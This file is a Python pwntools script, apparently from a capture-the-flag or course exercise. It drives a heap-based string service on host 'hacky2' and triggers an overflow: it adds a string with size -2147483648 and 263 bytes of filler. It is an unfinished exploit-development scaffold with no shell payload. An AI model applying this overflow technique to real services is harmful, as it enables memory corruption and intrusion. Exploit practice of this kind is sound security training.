#!/usr/bin/python3
import sys
import time
from pathlib import Path
from ctypes import CDLL
from itertools import count
from pwn import p64, sleep, remote, context

context.log_level = 'error' #disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
host = "hacky2"
port = 13726
if len(sys.argv) >= 2: host = sys.argv[1]
if len(sys.argv) >= 3: port = int(sys.argv[2])

def quit(target, verbose=True):
    if verbose: print("quit")
    target.write(b"quit\n")
def show(target, verbose=True):
    if verbose: print("show:")
    target.write(b"show\n")
    raw = []
    while True:
        line = target.readline()
        if b"ok" in line: break
        if verbose: print(line)
        raw.append(line)
    return raw
def add(target, n, raw, verbose=True, newline_terminate_string=True):
    if verbose: print(f"add {n} bytes: {raw}")
    target.write(b"add\n")
    target.write(str(n).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)

def edit(target, i, raw, verbose=True, newline_terminate_string=True):
    if verbose: print(f"edit string at index {i}: {raw}")
    target.write(b"edit\n")
    target.write(str(i).encode()+b"\n")
    target.write(raw+b"\n" if newline_terminate_string else raw)
    response = target.readuntil(b"\n")
    if verbose: print(response)
def delete(target, i, verbose=True):
    if verbose: print(f"\"delete\" string at index {i}")
    target.write(b"delete\n")
    target.write(str(i).encode()+b"\n")
    response = target.readuntil(b"\n")
    if verbose: print(response)

proc = remote(host, port)
add(proc, 16, b"BBBBBBBB\n")
add(proc, 16, b"CCCCCCCC\n")
add(proc, 16, b"DDDDDDDD\n")
input()
delete(proc, 1)
add(proc, -2147483648, b"A"*263+b"\n")
# edit(proc, 3, b"X"*263)
input()
show(proc)
# delete(proc, 3)
input()
proc.close()